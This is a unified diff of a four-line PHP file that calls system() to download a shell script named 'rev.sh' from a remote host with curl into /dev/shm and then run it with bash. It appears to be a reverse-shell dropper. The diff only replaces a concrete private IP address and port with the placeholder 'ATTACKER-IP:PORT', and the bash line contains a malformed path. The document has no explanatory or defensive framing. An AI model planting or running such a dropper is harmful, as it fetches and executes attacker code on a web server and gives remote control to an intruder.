@@ -1,4 +1,4 @@
 <?php
-system('curl http://10.14.10.117:1234/rev.sh -o /dev/shm/rev.sh');
+system('curl http://ATTACKER-IP:PORT/rev.sh -o /dev/shm/rev.sh');
 system('bash (dev/shm/rev.sh')
 ?>
